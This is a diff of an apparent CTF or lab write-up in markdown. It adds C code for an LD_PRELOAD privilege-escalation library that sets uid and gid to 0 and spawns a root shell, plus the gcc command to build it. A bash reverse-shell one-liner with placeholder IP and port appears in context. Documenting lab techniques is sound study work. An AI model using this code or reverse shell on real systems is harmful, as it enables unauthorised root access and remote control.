@@ -153,11 +153,18 @@ bash -i >& /dev/tcp/<ip>/<port> 0>&1
 ##### You can get a rev shell with user `production` logged in and can achieve privilage escalation using this c code -<br />
 
 Check out this blog for more on it [ld_preload-privesc](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
+
 ```c
-
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+setuid(0);
+system("/bin/sh");
+}
 ```
-
-![image](images/shell.png)
 
 `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`<br/>
 
